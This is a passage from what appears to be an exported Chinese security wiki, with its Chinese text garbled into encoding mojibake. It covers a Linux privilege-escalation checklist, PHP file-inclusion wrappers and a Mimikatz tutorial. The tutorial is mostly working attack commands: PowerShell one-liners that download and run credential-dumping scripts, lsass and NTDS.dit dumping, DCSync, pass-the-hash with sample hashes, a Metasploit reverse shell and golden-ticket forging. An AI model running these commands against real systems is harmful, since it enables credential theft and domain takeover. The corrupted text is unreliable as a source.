å¯èƒ½å¯¼è‡´ææƒï¼‰ å…³æ³¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);cap_setuid+ep/font ç­‰é«˜é£é™©æƒé™ï¼Œä¾‹å¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);python3 = cap_setuid+ep/font High ä½¿ç”¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);setcap -r æ–‡ä»¶/font ç§»é™¤å±é™© Capabilities è¿›ç¨‹ä¿¡æ¯ï¼ˆProcessesï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ps -eo pid,user,cmd,exe/font è¯†åˆ«ç‰¹æƒè¿›ç¨‹ï¼ˆå¦‚ root è¿è¡Œçš„æœåŠ¡ï¼‰åŠå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ æ£€æŸ¥è¿›ç¨‹æ˜¯å¦å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´æˆ–å¯å†™çš„å¯æ‰§è¡Œæ–‡ä»¶ Medium é™åˆ¶è¿›ç¨‹æƒé™ï¼Œä½¿ç”¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);chroot/font æˆ–å®¹å™¨éš”ç¦»é«˜å±æœåŠ¡ æ–‡ä»¶ç³»ç»Ÿæƒé™ï¼ˆFilesystemï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ls -la //fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);mount/font æ£€æŸ¥ç²˜æ€§ä½ï¼ˆsticky bitï¼‰ã€font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);noexec/fontfont style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nosuid/font æŒ‚è½½é€‰é¡¹ã€å¯å†™ç›®å½•ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font æƒé™ï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font è‹¥ä¸º font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);rwx/font ä¸”æ— ç²˜æ€§ä½ï¼Œå¯èƒ½å­˜åœ¨æ–‡ä»¶è¦†ç›–é£é™©ï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/etc/passwd/font å¯å†™æ€§éœ€é‡ç‚¹å…³æ³¨ High å¯¹ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/font è®¾ç½® font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sticky bit/fontï¼Œå¯¹ç³»ç»Ÿç›®å½•å¯ç”¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nosuid/font è®¡åˆ’ä»»åŠ¡ï¼ˆCron Scheduled Tasksï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);crontab -l/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);cat /etc/crontab/font æ£€æŸ¥è®¡åˆ’ä»»åŠ¡æ˜¯å¦å­˜åœ¨é«˜é£é™©è„šæœ¬ï¼ˆå¦‚æ‰€æœ‰è€…ä¸º root ä½†å¯è¢«ä½æƒé™ç”¨æˆ·ä¿®æ”¹çš„è„šæœ¬ï¼‰ å…³æ³¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);* * * * */font é«˜é¢‘ä»»åŠ¡ï¼ŒåŠ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sh /tmp/script.sh/font ç­‰ä½¿ç”¨ç›¸å¯¹è·¯å¾„çš„å‘½ä»¤ High é™åˆ¶è®¡åˆ’ä»»åŠ¡è„šæœ¬æƒé™ä¸º font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);root:root 600/fontï¼Œé¿å…ä½¿ç”¨ç›¸å¯¹è·¯å¾„ ç¯å¢ƒå˜é‡ï¼ˆEnvironmentï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);echo $PATH/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);env/font æ£€æŸ¥ PATH æ˜¯å¦åŒ…å«å¯å†™ç›®å½•ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp/fontï¼‰ï¼Œå¯èƒ½å¯¼è‡´å‘½ä»¤åŠ«æŒ è‹¥ PATH ä¸­å¯å†™ç›®å½•ä½äºç³»ç»Ÿç›®å½•å‰ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/tmp:/usr/bin/fontï¼‰ï¼Œé£é™©æ›´é«˜ Medium æ¸…ç† PATH ä¸­çš„å¯å†™ç›®å½•ï¼Œä½¿ç”¨ç»å¯¹è·¯å¾„æ‰§è¡Œå‘½ä»¤ Sudo é…ç½®ï¼ˆSudo Privilege Escalationï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo -l/font æŸ¥æ‰¾ sudo é…ç½®é”™è¯¯ï¼ˆå¦‚æ— éœ€å¯†ç çš„å‘½ä»¤ï¼‰åŠå…è®¸æ‰§è¡Œçš„å‘½ä»¤ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo vi/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo find/fontï¼‰ ç»“åˆ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);GTFOBins/font æ£€æŸ¥å…è®¸çš„å‘½ä»¤æ˜¯å¦å­˜åœ¨ææƒæ–¹æ³•ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo vi - :!bash/fontï¼‰ High æœ€å°åŒ– sudo æƒé™ï¼Œç¦æ­¢æ— å¯†ç æ‰§è¡Œæ•æ„Ÿå‘½ä»¤ è®¤è¯æ—¥å¿—ï¼ˆAuth Logsï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);cat /var/log/auth.log 2/dev/null/font å®¡è®¡è®¤è¯äº‹ä»¶ï¼ˆå¦‚å¤±è´¥ç™»å½•ã€sudo ææƒå°è¯•ï¼‰ï¼Œè¯†åˆ«å¯ç–‘ææƒè¡Œä¸º å…³æ³¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo: PAM authentication failure/font æˆ– font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);root : TTY=pts/0 ; COMMAND=/bin/bash/font Medium å¯ç”¨æ—¥å¿—å®¡è®¡å·¥å…·ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);auditd/fontï¼‰ï¼Œç›‘æ§æ•æ„Ÿå‘½ä»¤æ‰§è¡Œ å·²å®‰è£…åŒ…ï¼ˆInstalled Packagesï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);dpkg -l/fontï¼ˆDebianï¼‰ï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);rpm -qa/fontï¼ˆRHELï¼‰ åˆ—å‡ºå·²å®‰è£…åŒ…ç‰ˆæœ¬ï¼Œæ’æŸ¥å·²çŸ¥æ¼æ´ç‰ˆæœ¬ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);polkit/font æ¼æ´å¯¹åº”ç‰ˆæœ¬ï¼‰ ç»“åˆ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CVE Details/font æˆ– font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nessus/font æ£€æŸ¥åŒ…ç‰ˆæœ¬æ˜¯å¦å­˜åœ¨æœ¬åœ°ææƒæ¼æ´ High"},{"title":"åè®®&&ä¼ªåè®®","path":"/wiki/WP/æ–‡ä»¶åŒ…å«/åè®®&&ä¼ªåè®®.html","content":"file:php:input # æ‰§è¡Œphpä»£ç php:filter # è¯»å–æºç zip: #å‹ç¼©æ–‡ä»¶ 1.ä»€ä¹ˆæ˜¯åè®®åè®®å‘¢ï¼Ÿå°±æ˜¯åŒæ–¹éƒ½èƒ½å¬æ˜ç™½çš„ä¸€ä¸ªæ²Ÿé€šçº¦å®šè¯­è¨€ï¼Œæ¯”å¦‚æˆ‘ä»¬è¯´çš„è¿™ä¸ªæ™®é€šè¯ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯ä¸€ç§åè®®å•Šï¼Œæœ‰äº†å®ƒï¼Œæˆ‘ä»¬å¤©å—æµ·å°åŒ—çš„äººéƒ½èƒ½è¯´ä¸€ä¸ªåŒä¸€ä¸ªè¯­è°ƒï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸œåŒ—çš„è´µå·çš„è¯´è¯äº’ç›¸çš„æ‰èƒ½å¬å¾—æ‡‚ï¼Œé‚£ä¹ˆåœ¨æˆ‘ä»¬è®¡ç®—æœºä¸­å‘¢ä¹Ÿæœ‰å¾ˆå¤šåè®® å¸¸è§çš„ç½‘ç»œå±‚æœ‰ IPåè®®ã€ICMPåè®®ã€ARPåè®®ã€IGMPåè®® åº”ç”¨å±‚ httpåè®®ã€httpsåè®®ã€ftpåè®®ã€sshåè®®ã€gopheråè®®ã€qqæ‹‰èµ·åè®® 2.åè®®çš„æ ¼å¼åè®®å¤´:å†…å®¹(å¤šä¸ºäºŒè¿›åˆ¶ 3.phpä¸­çš„åè®®file: è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨ä¸å†™åè®®åå­—çš„æƒ…å†µä¸‹ï¼Œå°±é»˜è®¤æ˜¯fileåè®®å®ƒæ˜¯æ”¯æŒè¿™ä¸ªè·¯å¾„æ··æ‚æ¨¡å¼ï¼Œä»€ä¹ˆå«åšæ··æ‚æ¨¡å¼ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨linuxä¸‹ï¼Œè·¯å¾„å‘¢ä¸€èˆ¬åˆ†ä¸ºä»€ä¹ˆå¯¹å§ï¼Œåˆ†ä¸ºç›¸å¯¹è·¯å¾„å’Œç»å¯¹è·¯å¾„ï¼Œå‡è®¾æˆ‘ä»¬ä½¿ç”¨includeåŒ…å«ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„flag.php,å®é™…ä¸Šæ˜¯åŒ…å«varwwwhtmlflag.php,å®ƒä¼šç”±ç›¸å¯¹è·¯å¾„è½¬æ¢ä¸ºç»å¯¹è·¯å¾„ http: è®¿é—® HTTP(s) ç½‘å€ï¼Œå¯ä»¥è·å–è¿œç¨‹çš„å†…å®¹ï¼Œè¿”å›åˆ°æœ¬åœ°ï¼Œä¹Ÿå¯ä»¥ç”¨åŒ…å«å‡½æ•°åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥è¯»å–è¿œç¨‹çš„phpæ–‡ä»¶åœ¨æœ¬åœ°æ‰§è¡Œï¼ŒRCEã€‚æ³¨æ„ï¼šåŒ…å«è¿œç¨‹æ–‡ä»¶éœ€åœ¨php.iniä¸­å°†allow_url_includeè®¾ç½®ä¸ºOnã€‚ ftp: é»˜è®¤21ç«¯å£ï¼Œè¿›è¡Œæ–‡ä»¶ä¼ è¾“çš„åè®® data: data: #æ‰§è¡Œphpä»£ç  ?urldata:textplain, **data:**base64 ?urldata:textplain;base64, æ•°æ®ï¼ˆRFC 2397ï¼‰data: åŒæ ·ç±»ä¼¼ä¸php:inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ phar: â€” PHP å½’æ¡£ glob: â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ ssh2: â€” Secure Shell 2 rar: â€” RAR ogg: â€” éŸ³é¢‘æµ expect: â€” å¤„ç†äº¤äº’å¼çš„æµ zlib: â€” å‹ç¼©æµ zip: bzip2: zlib: åè®®ï¼š æ¡ä»¶ï¼šallow_url_fopen:offon allow_url_include :offon ä½œâ½¤ï¼šzip: bzip2: zlib: å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©â½‚ä»¶ä¸­çš„â¼¦â½‚ ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€å â½¤æ³•ï¼šzip:[å‹ç¼©â½‚ä»¶ç»å¯¹è·¯å¾„]%23[å‹ç¼©â½‚ä»¶å†…çš„â¼¦â½‚ä»¶å] compress.bzip2:file.bz2 compress.zlib:file.gz å…¶ä¸­phar:å’Œzip:ç±»ä¼¼"},{"title":"Mimikatzæ•™ç¨‹","path":"/wiki/å†…ç½‘/ææƒ/Mimikatzæ•™ç¨‹.html","content":"0x00 ç®€ä»‹Mimikatz æ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„è½»é‡çº§è°ƒè¯•ç¥å™¨ï¼Œé€šè¿‡å®ƒä½ å¯ä»¥æå‡è¿›ç¨‹æƒé™æ³¨å…¥è¿›ç¨‹è¯»å–è¿›ç¨‹å†…å­˜ï¼Œå½“ç„¶ä»–æœ€å¤§çš„äº®ç‚¹å°±æ˜¯ä»–å¯ä»¥ç›´æ¥ä» lsass.exe è¿›ç¨‹ä¸­è·å–å½“å‰ç™»å½•ç³»ç»Ÿç”¨æˆ·åçš„å¯†ç ï¼Œ lsassæ˜¯å¾®è½¯Windowsç³»ç»Ÿçš„å®‰å…¨æœºåˆ¶å®ƒä¸»è¦ç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»é™†ç­–ç•¥ï¼Œé€šå¸¸æˆ‘ä»¬åœ¨ç™»é™†ç³»ç»Ÿæ—¶è¾“å…¥å¯†ç ä¹‹åï¼Œå¯†ç ä¾¿ä¼šå‚¨å­˜åœ¨ lsasså†…å­˜ä¸­ï¼Œç»è¿‡å…¶ wdigest å’Œ tspkg ä¸¤ä¸ªæ¨¡å—è°ƒç”¨åï¼Œå¯¹å…¶ä½¿ç”¨å¯é€†çš„ç®—æ³•è¿›è¡ŒåŠ å¯†å¹¶å­˜å‚¨åœ¨å†…å­˜ä¹‹ä¸­ï¼Œ è€Œ mimikatz æ­£æ˜¯é€šè¿‡å¯¹lsassé€†ç®—è·å–åˆ°æ˜æ–‡å¯†ç ï¼ä¹Ÿå°±æ˜¯è¯´åªè¦ä½ ä¸é‡å¯ç”µè„‘ï¼Œå°±å¯ä»¥é€šè¿‡ä»–è·å–åˆ°ç™»é™†å¯†ç ï¼Œåªé™å½“å‰ç™»é™†ç³»ç»Ÿï¼ æ³¨ï¼šä½†æ˜¯åœ¨å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwindows server 2012æ—¶ï¼Œç³»ç»Ÿçš„å†…å­˜ä¸­å°±ä¸å†ä¿å­˜æ˜æ–‡çš„å¯†ç ï¼Œè¿™æ ·åˆ©ç”¨mimikatzå°±ä¸èƒ½ä»å†…å­˜ä¸­è¯»å‡ºæ˜æ–‡å¯†ç äº†ã€‚mimikatzçš„ä½¿ç”¨éœ€è¦administratorç”¨æˆ·æ‰§è¡Œï¼Œadministratorsä¸­çš„å…¶ä»–ç”¨æˆ·éƒ½ä¸è¡Œã€‚ è¿™é‡Œæ”¾å‡ ä¸ªç¥å™¨çš„è¿è¡Œå§¿åŠ¿ï¼šä¹ç§å§¿åŠ¿è¿è¡Œï¼šMimikatzï¼šhttps://www.freebuf.com/articles/web/176796.html å€Ÿç”¨PowerShell Copy#è¯»å–å¯†ç æ˜æ–‡(éœ€è¦ç®¡ç†å‘˜æƒé™)powershell IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1); Invoke-Mimikatz â€“DumpCerts Copy#è¯»å–å¯†ç hashå€¼(éœ€è¦ç®¡ç†å‘˜æƒé™)powershell IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1);Get-PassHashes 0x01 è·å–æœ¬åœ°å¸æˆ·å¯†ç 1.1 æœ¬åœ°æ‰§è¡Œä¸‹è½½mimikatzç¨‹åºï¼Œæ‰¾åˆ°è‡ªå·±ç³»ç»Ÿå¯¹åº”çš„ä½æ•°ï¼Œå³é”®ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼š Copy#æå‡æƒé™privilege::debug#æŠ“å–å¯†ç sekurlsa::logonpasswords å½“ç›®æ ‡ä¸ºwin10æˆ–2012R2ä»¥ä¸Šæ—¶ï¼Œé»˜è®¤åœ¨å†…å­˜ç¼“å­˜ä¸­ç¦æ­¢ä¿å­˜æ˜æ–‡å¯†ç ï¼Œä½†å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼æŠ“å–æ˜æ–‡ã€‚ cmdä¿®æ”¹æ³¨å†Œè¡¨å‘½ä»¤ï¼š Copyreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f#é‡å¯æˆ–ç”¨æˆ·é‡æ–°ç™»å½•åå¯ä»¥æˆåŠŸæŠ“å– 1.2 SAMè¡¨è·å–hashCopy#å¯¼å‡ºSAMæ•°æ®reg save HKLM\\SYSTEM SYSTEMreg save HKLM\\SAM SAM#ä½¿ç”¨mimikatzæå–hashlsadump::sam /sam:SAM /system:SYSTEM 0x02 Procdump+Mimikatzå½“mimikatzæ— æ³•åœ¨ä¸»æœºä¸Šè¿è¡Œæ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¾®è½¯å®˜æ–¹å‘å¸ƒçš„å·¥å…·Procdumpå¯¼å‡ºlsass.exe: Copyprocdump64.exe -accepteula -ma lsass.exe lsass.dmp å°†lsass.dmpä¸‹è½½åˆ°æœ¬åœ°åï¼Œç„¶åæ‰§è¡Œmimikatz: Copymimikatz.exe sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords full exit ä¸ºäº†æ–¹ä¾¿å¤åˆ¶ä¸æŸ¥çœ‹ï¼Œå¯ä»¥è¾“å‡ºåˆ°æœ¬åœ°æ–‡ä»¶é‡Œé¢ï¼š Copymimikatz.exe sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords full pssword.txt 0x03 è¯»å–åŸŸæ§ä¸­åŸŸæˆå‘˜Hash3.1 åŸŸæ§æœ¬åœ°è¯»å–æ³¨ï¼šå¾—åœ¨åŸŸæ§ä¸Šä»¥åŸŸç®¡ç†å‘˜èº«ä»½æ‰§è¡Œmimikatz æ–¹æ³•ä¸€ï¼šç›´æ¥æ‰§è¡Œ Copy#æå‡æƒé™privilege::debugæŠ“å–å¯†ç lsadump::lsa /patch æ–¹æ³•äºŒï¼šé€šè¿‡ dcsyncï¼Œåˆ©ç”¨ç›®å½•å¤åˆ¶æœåŠ¡ï¼ˆDRSï¼‰ä»NTDS.DITæ–‡ä»¶ä¸­æ£€ç´¢å¯†ç å“ˆå¸Œå€¼ï¼Œå¯ä»¥åœ¨åŸŸç®¡æƒé™ä¸‹æ‰§è¡Œè·å–ï¼š Copy#è·å–æ‰€æœ‰åŸŸç”¨æˆ·lsadump::dcsync /domain:test.com /all /csv#æŒ‡å®šè·å–æŸä¸ªç”¨æˆ·çš„hashlsadump::dcsync /domain:test.com /user:test 3.2 å¯¼å‡ºåŸŸæˆå‘˜HashCopy åŸŸè´¦æˆ·çš„ç”¨æˆ·åå’Œhashå¯†ç ä»¥åŸŸæ•°æ®åº“çš„å½¢å¼å­˜æ”¾åœ¨åŸŸæ§åˆ¶å™¨çš„ font style=color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);%SystemRoot% tds\\NTDS.DIT/font æ–‡ä»¶ä¸­ã€‚ è¿™é‡Œå¯ä»¥å€ŸåŠ©ï¼šntdsutil.exeï¼ŒåŸŸæ§åˆ¶å™¨è‡ªå¸¦çš„åŸŸæ•°æ®åº“ç®¡ç†å·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŸŸæ•°æ®åº“ï¼Œæå–å‡ºåŸŸä¸­æ‰€æœ‰çš„åŸŸç”¨æˆ·ä¿¡æ¯ï¼Œåœ¨åŸŸæ§ä¸Šä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¯¼å‡ºåŸŸæ•°æ®åº“ï¼š Copy#åˆ›å»ºå¿«ç…§ntdsutil snapshot activate instance ntds create quit quit#åŠ è½½å¿«ç…§ntdsutil snapshot mount 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quit#Copyæ–‡ä»¶å‰¯æœ¬copy C:\\$SNAP_201911211122_VOLUMEC$\\windows\\NTDS tds.dit c: tds.dit å°†ntds.ditæ–‡ä»¶æ‹·è´åˆ°æœ¬åœ°åˆ©ç”¨impacketè„šæœ¬dumpå‡ºHashï¼š Copysecretsdump.py -ntds.dit -system system.hive LOCAL é™¤äº†å€ŸåŠ©pythonï¼Œè¿˜æœ‰ä¸€ä¸ªNTDSDumpExï¼ˆä¼šè¢«360æŸ¥æ€çš„å“¦ï¼‰ï¼š å·¥å…·åœ°å€ï¼šhttps://github.com/zcgonvh/NTDSDumpEx/releases CopyNTDSDumpEx -d ntds.dit -o domain.txt -s system.hiv (system.hiveæ–‡ä»¶è·å–:reg save hklm\\system system.hive)NTDSDumpEx -d ntds.dit -o domain.txt -r (æ­¤å‘½ä»¤é€‚ç”¨äºåœ¨åŸŸæ§æœ¬åœ°æ‰§è¡Œ) æœ€åè®°å¾—å¸è½½åˆ é™¤å¿«ç…§ï¼š Copyntdsutil snapshot unmount 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quitntdsutil snapshot delete 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quit 3.3 secretsdumpè„šæœ¬ç›´æ¥å¯¼å‡ºåŸŸhashä¸ºä»€ä¹ˆè¦å†æä¸€ésecretsdumpå‘¢ï¼Œå› ä¸ºå®ƒå¯ä»¥ç›´æ¥å¯¼å‡ºï¼Œè¯´ç™½äº†ï¼Œç®€å•ç²—æš´ï¼š Copypython secretsdump.py rabbitmask:123456@192.168.15.181 é¦–å…ˆå®ƒä¼šå¯¼å‡ºæœ¬åœ°SAMä¸­çš„hashï¼Œç„¶åæ˜¯æ‰€æœ‰åŸŸå†…ç”¨æˆ·çš„IPï¼Œå…¨éƒ¨è·å–æˆåŠŸ 0x04 å“ˆå¸Œä¼ é€’æ”»å‡»PTH4.1 å·¥ä½œç»„ç¯å¢ƒå½“æˆ‘ä»¬è·å¾—äº†ä¸€å°ä¸»æœºçš„NTLMå“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨mimikatzå¯¹å…¶è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ã€‚æ‰§è¡Œå®Œå‘½ä»¤åï¼Œä¼šå¼¹å‡ºcmdçª—å£ã€‚ Copy#ä½¿ç”¨administratorç”¨æˆ·çš„NTLMå“ˆå¸Œå€¼è¿›è¡Œæ”»å‡»sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9 Copy#ä½¿ç”¨xieç”¨æˆ·çš„NTLMå“ˆå¸Œå€¼è¿›è¡Œæ”»å‡»sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9 åœ¨å¼¹å‡ºçš„cmdçª—å£ï¼Œæˆ‘ä»¬ç›´æ¥å¯ä»¥è¿æ¥è¯¥ä¸»æœºï¼Œå¹¶ä¸”æŸ¥çœ‹è¯¥ä¸»æœºä¸‹çš„æ–‡ä»¶å¤¹ã€‚ æˆ–è€…å¯ä»¥ç›´æ¥å°†è¯¥ä¸»æœºçš„Cç›˜æ˜ å°„åˆ°æœ¬åœ°çš„Kç›˜ã€‚ æ³¨ï¼šåªèƒ½åœ¨ mimikatz å¼¹å‡ºçš„ cmd çª—å£æ‰å¯ä»¥æ‰§è¡Œè¿™äº›æ“ä½œï¼Œæ³¨å…¥æˆåŠŸåï¼Œå¯ä»¥ä½¿ç”¨psexecã€wmicã€wmiexecç­‰å®ç°è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚ 4.2 åŸŸç¯å¢ƒåœ¨åŸŸç¯å¢ƒä¸­ï¼Œå½“æˆ‘ä»¬è·å¾—äº†åŸŸå†…ç”¨æˆ·çš„NTLMå“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŸŸå†…çš„ä¸€å°ä¸»æœºç”¨mimikatzå¯¹åŸŸæ§è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ã€‚æ‰§è¡Œå®Œå‘½ä»¤åï¼Œä¼šå¼¹å‡ºcmdçª—å£ã€‚å‰ææ˜¯æˆ‘ä»¬å¿…é¡»æ‹¥æœ‰åŸŸå†…ä»»æ„ä¸€å°ä¸»æœºçš„æœ¬åœ° administrator æƒé™å’Œè·å¾—äº†åŸŸç”¨æˆ·çš„NTLMå“ˆå¸Œå€¼ åŸŸï¼šxie.comåŸŸæ§ï¼šWIN2008.xie.com Copy#ä½¿ç”¨åŸŸç®¡ç†å‘˜administratorçš„NTLMå“ˆå¸Œå€¼å¯¹åŸŸæ§è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»sekurlsa::pth /user:administrator /domain:xie.com /ntlm:dbd621b8ed24eb627d32514476fac6c5 Copy#ä½¿ç”¨åŸŸç”¨æˆ·xieçš„NTLMå“ˆå¸Œå€¼å¯¹åŸŸæ§è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»sekurlsa::pth /user:xie /domain:xie.com /ntlm:329153f560eb329c0e1deea55e88a1e9 4.3 MSFè¿›è¡Œå“ˆå¸Œä¼ é€’Copy æœ‰äº›æ—¶å€™ï¼Œå½“æˆ‘ä»¬è·å–åˆ°äº†æŸå°ä¸»æœºçš„Administratorç”¨æˆ·çš„LM-Hashå’Œ NTLM-Hash ï¼Œå¹¶ä¸”è¯¥ä¸»æœºçš„445ç«¯å£æ‰“å¼€ç€ã€‚æˆ‘ä»¬åˆ™å¯ä»¥åˆ©ç”¨ font style=color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);exploit/windows/smb/psexec/font æ¼æ´ç”¨MSFè¿›è¡Œè¿œç¨‹ç™»å½•(å“ˆå¸Œä¼ é€’æ”»å‡»)ã€‚(åªèƒ½æ˜¯administratorç”¨æˆ·çš„LM-hashå’ŒNTLM-hash)ï¼Œè¿™ä¸ªåˆ©ç”¨è·Ÿå·¥ä½œç»„ç¯å¢ƒæˆ–è€…åŸŸç¯å¢ƒæ— å…³ã€‚ Copymsf use exploit/windows/smb/psexecmsf exploit(psexec) set payload windows/meterpreter/reverse_tcpmsf exploit(psexec) set lhost 192.168.10.27msf exploit(psexec) set rhost 192.168.10.14msf exploit(psexec) set smbuser Administratormsf exploit(psexec) set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6 #è¿™é‡ŒLMå’ŒNTLMæˆ‘ä»¬å·²ç»è·å–åˆ°äº†msf exploit(psexec) exploit 0x05 ç¥¨æ®ä¼ é€’æ”»å‡»(PTT)5.1 é»„é‡‘ç¥¨æ®åŸŸä¸­æ¯ä¸ªç”¨æˆ·çš„ Ticket éƒ½æ˜¯ç”± krbtgt çš„å¯†ç  Hash æ¥è®¡ç®—ç”Ÿæˆçš„ï¼Œå› æ­¤åªè¦è·å–åˆ°äº† krbtgt ç”¨æˆ·çš„å¯†ç  Hash ï¼Œå°±å¯ä»¥éšæ„ä¼ªé€  Ticket ï¼Œè¿›è€Œä½¿ç”¨ Ticket ç™»é™†åŸŸæ§åˆ¶å™¨ï¼Œä½¿ç”¨ krbtgt ç”¨æˆ· hash ç”Ÿæˆçš„ç¥¨æ®è¢«ç§°ä¸º Golden Ticketï¼Œæ­¤ç±»æ”»å‡»æ–¹æ³•è¢«ç§°ä¸ºç¥¨æ®ä¼ é€’æ”»å‡»ã€‚ é¦–å…ˆè·å–krbtgtçš„ç”¨æˆ·hash: Copymimikatz lsadump::dcsync /domain:xx.com /user:krbtgt åˆ©ç”¨ mimikatz ç”ŸæˆåŸŸç®¡æƒé™çš„ Golden Ticketï¼Œå¡«å…¥å¯¹åº”çš„åŸŸç®¡ç†å‘˜è´¦å·ã€åŸŸåç§°ã€sidå€¼ï¼Œå¦‚ä¸‹ï¼š Copykerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 